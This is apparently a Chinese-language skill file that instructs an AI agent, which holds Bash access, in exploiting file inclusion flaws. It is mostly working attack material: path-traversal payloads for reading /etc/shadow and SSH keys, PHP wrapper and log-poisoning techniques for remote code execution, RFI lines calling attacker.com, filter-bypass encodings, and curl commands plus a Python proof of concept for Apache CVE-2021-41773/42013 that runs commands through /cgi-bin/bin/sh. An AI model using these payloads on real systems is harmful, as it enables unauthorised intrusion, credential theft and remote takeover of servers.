---
name: file-inclusion
description: 文件包含漏洞检测与利用。当目标存在文件读取、页面包含、模板加载、语言切换功能时使用。包括 LFI、RFI、路径遍历。
allowed-tools: Bash, Read, Write
---

# 文件包含 (File Inclusion)

通过操纵文件路径参数，读取服务器敏感文件或执行恶意代码。

## 常见指示器

- 文件参数（file=, page=, path=, template=, lang=, include=）
- 语言/主题切换功能
- 文档下载功能
- 图片/文件预览功能
- 模板加载功能
- 日志查看功能

## 检测方法

### 1. 基础测试

```bash
# 路径遍历
curl "http://target.com/page?file=../../../etc/passwd"
curl "http://target.com/page?file=....//....//....//etc/passwd"

# 绝对路径
curl "http://target.com/page?file=/etc/passwd"

# 空字节截断 (PHP < 5.3.4)
curl "http://target.com/page?file=../../../etc/passwd%00"
```

### 2. 协议测试

```bash
# PHP 伪协议
curl "http://target.com/page?file=php://filter/convert.base64-encode/resource=index.php"
curl "http://target.com/page?file=php://input" -d "<?php system('id'); ?>"
```

## 攻击向量

### 本地文件包含 (LFI)

```bash
# 基础路径遍历
../../../etc/passwd
..\..\..\..\windows\win.ini
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd

# 绝对路径
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log

# Windows 路径
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\logs\LogFiles\
C:\xampp\apache\logs\access.log
```

### 远程文件包含 (RFI)

```bash
# 基础 RFI
http://attacker.com/shell.txt
http://attacker.com/shell.txt?
http://attacker.com/shell.txt%00

# 数据 URI
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

### PHP 伪协议

```bash
# 读取源码 (Base64)
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=config.php

# 代码执行
php://input
# POST: <?php system('id'); ?>

# 数据流
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# 期望协议
expect://id
expect://ls

# ZIP 协议
zip://path/to/file.zip%23shell.php
phar://path/to/file.phar/shell.php
```

### 日志文件包含

```bash
# 1. 污染日志
curl "http://target.com/" -A "<?php system(\$_GET['cmd']); ?>"

# 2. 包含日志
curl "http://target.com/page?file=/var/log/apache2/access.log&cmd=id"

# 常见日志路径
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/access_log
/var/log/httpd/error_log
/var/log/auth.log
/var/log/mail.log
/var/log/vsftpd.log
/proc/self/fd/1
```

### Session 文件包含

```bash
# 1. 污染 session
# 在用户名等字段注入 PHP 代码

# 2. 包含 session 文件
/tmp/sess_<PHPSESSID>
/var/lib/php/sessions/sess_<PHPSESSID>
/var/lib/php5/sess_<PHPSESSID>
C:\Windows\Temp\sess_<PHPSESSID>
```

### /proc 文件利用

```bash
# 环境变量
/proc/self/environ

# 命令行
/proc/self/cmdline

# 文件描述符
/proc/self/fd/0
/proc/self/fd/1
/proc/self/fd/2

# 内存映射
/proc/self/maps

# 当前工作目录
/proc/self/cwd/index.php
```

## 绕过技术

### 路径绕过

```bash
# 双写绕过
....//....//....//etc/passwd
..../\..../\..../\etc/passwd

# URL 编码
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd

# Unicode 编码
..%c0%af..%c0%af..%c0%afetc/passwd
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd

# 空字节截断 (PHP < 5.3.4)
../../../etc/passwd%00
../../../etc/passwd%00.php
../../../etc/passwd%00.jpg
```

### 后缀绕过

```bash
# 空字节
../../../etc/passwd%00
../../../etc/passwd%00.php

# 路径截断 (长路径)
../../../etc/passwd/./././././[...]/./
../../../etc/passwd.....................[...]

# 问号截断
../../../etc/passwd?
../../../etc/passwd?.php
```

### 过滤绕过

```bash
# ../ 被过滤
....//
..../\
....\/
%2e%2e%2f
%2e%2e/
..%2f
%2e%2e%5c

# etc/passwd 被过滤
/etc/./passwd
/etc/passwd/.
/etc//passwd
/etc/passwd/
```

### 协议绕过

```bash
# http:// 被过滤
hTtP://attacker.com/shell.txt
HTTP://attacker.com/shell.txt
//attacker.com/shell.txt

# php:// 被过滤
PHP://filter/convert.base64-encode/resource=index.php
pHp://filter/convert.base64-encode/resource=index.php
```

## 敏感文件列表

### Linux

```
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/hostname
/etc/resolv.conf
/etc/crontab
/etc/ssh/sshd_config
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/mysql/my.cnf
/root/.bash_history
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/user/.bash_history
/home/user/.ssh/id_rsa
/proc/version
/proc/cmdline
/proc/self/environ
/var/log/auth.log
/var/log/apache2/access.log
/var/log/apache2/error.log
```

### Windows

```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\repair\SAM
C:\Windows\repair\SYSTEM
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\Users\Administrator\.ssh\id_rsa
```

### Web 应用

```
# PHP
index.php
config.php
database.php
db.php
settings.php
.htaccess
.htpasswd
wp-config.php
configuration.php

# Java
WEB-INF/web.xml
WEB-INF/classes/
META-INF/MANIFEST.MF

# Python
settings.py
config.py
app.py
requirements.txt

# Node.js
package.json
.env
config.json
```

## LFI to RCE

### 方法 1: 日志污染

```bash
# 1. 注入 PHP 代码到 User-Agent
curl "http://target.com/" -A "<?php system(\$_GET['cmd']); ?>"

# 2. 包含日志文件
curl "http://target.com/page?file=/var/log/apache2/access.log&cmd=id"
```

### 方法 2: PHP 伪协议

```bash
# php://input
curl "http://target.com/page?file=php://input" -d "<?php system('id'); ?>"

# data://
curl "http://target.com/page?file=data://text/plain,<?php system('id'); ?>"
```

### 方法 3: Session 污染

```bash
# 1. 在 session 中注入代码
# 2. 包含 session 文件
curl "http://target.com/page?file=/tmp/sess_<PHPSESSID>&cmd=id"
```

### 方法 4: /proc/self/environ

```bash
# 1. 注入代码到 User-Agent
curl "http://target.com/" -A "<?php system(\$_GET['cmd']); ?>"

# 2. 包含 environ
curl "http://target.com/page?file=/proc/self/environ&cmd=id"
```

### 方法 5: 文件上传 + LFI

```bash
# 1. 上传包含 PHP 代码的图片
# 2. 通过 LFI 包含上传的文件
curl "http://target.com/page?file=../uploads/shell.jpg"
```

## 最佳实践

1. 先测试基础路径遍历: `../../../etc/passwd`
2. 尝试不同编码和绕过技术
3. 测试 PHP 伪协议读取源码
4. 尝试 LFI to RCE（日志污染、php://input）
5. 检查是否支持 RFI
6. 枚举敏感文件（配置文件、密钥、日志）
7. 分析源码寻找更多漏洞

---

## Apache HTTP Server 路径穿越（CVE-2021-41773 / CVE-2021-42013 类）

### ⚠️ 关键注意事项

此类漏洞利用时有两个极易犯错的地方：

**1. URL 编码不能被客户端二次处理**

Python `requests` 库会自动对 `%2e` 再次编码为 `%252e`，导致 payload 失效。
必须使用以下方式之一发送请求：

```bash
# ✅ 方法1：curl 加 --path-as-is（推荐，最简单）
curl -s --path-as-is "http://TARGET:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# ✅ 方法2：Python requests 绕过自动编码
import requests
from requests import Request, Session
s = Session()
url = "http://TARGET:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
req = Request('GET', url)
prepared = req.prepare()
prepared.url = url  # 强制覆盖，禁止 requests 自动编码
resp = s.send(prepared)
print(resp.text)

# ❌ 错误方法（requests 会二次编码 %2e → %252e，导致 400/404）
import requests
requests.get("http://TARGET:8080/icons/.%2e/.%2e/etc/passwd")
```

**2. 路径前缀必须是 `/icons/`（文件读取）或 `/cgi-bin/`（RCE）**

`/cgi-bin/` 前缀只能用于 RCE，文件读取必须用 `/icons/`，原因是靶机 Apache 配置中
`/icons/` 目录未设置 `Require all denied`，而 `/cgi-bin/` 目录有额外限制。

### CVE-2021-41773 利用方法

**文件读取（必须用 `/icons/` 路径）：**

```bash
# 读取 /etc/passwd（验证漏洞有效性）
curl -s --path-as-is "http://TARGET:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# 读取其他敏感文件
curl -s --path-as-is "http://TARGET:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow"
curl -s --path-as-is "http://TARGET:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/root/.bash_history"
curl -s --path-as-is "http://TARGET:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/usr/local/apache2/conf/httpd.conf"
```

**RCE（需要 Apache 开启 mod_cgi，用 `/cgi-bin/` 路径）：**

```bash
# 执行命令（--data 中 echo; 是换行符，后接命令）
curl -s --path-as-is --data "echo;id" "http://TARGET:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
curl -s --path-as-is --data "echo;cat /etc/passwd" "http://TARGET:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
curl -s --path-as-is --data "echo;ls /" "http://TARGET:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
```

### CVE-2021-42013 利用方法（Apache 2.4.50，双重编码绕过）

```bash
# 双重编码：% → %%32%35（仅针对 2.4.50）
curl -s --path-as-is "http://TARGET:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"
curl -s --path-as-is --data "echo;id" "http://TARGET:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
```

### Python PoC 模板

```python
import subprocess

TARGET = "http://TARGET:8080"

def path_traversal_read(path, prefix="/icons"):
    """
    路径遍历文件读取（通过 curl --path-as-is 绕过编码问题）
    """
    payload = f"{prefix}/.%2e/%2e%2e/%2e%2e/%2e%2e{path}"
    url = f"{TARGET}{payload}"
    result = subprocess.run(
        ["curl", "-s", "--path-as-is", url],
        capture_output=True, text=True, timeout=10
    )
    return result.stdout

def rce(command, prefix="/cgi-bin"):
    """
    RCE 命令执行（需要 mod_cgi 启用）
    """
    payload = f"{prefix}/.%2e/.%2e/.%2e/.%2e/bin/sh"
    url = f"{TARGET}{payload}"
    result = subprocess.run(
        ["curl", "-s", "--path-as-is", "--data", f"echo;{command}", url],
        capture_output=True, text=True, timeout=10
    )
    return result.stdout

# 验证漏洞
print("[*] 测试文件读取...")
output = path_traversal_read("/etc/passwd")
if "root:x:0:0" in output:
    print("[✓] 路径遍历成功！")
    print(output)
else:
    print(f"[-] 文件读取失败，响应: {output[:200]}")

# 测试 RCE
print("[*] 测试 RCE...")
output = rce("id")
if "uid=" in output:
    print("[✓] RCE 成功！")
    print(output)
else:
    print(f"[-] RCE 失败，响应: {output[:200]}")
```

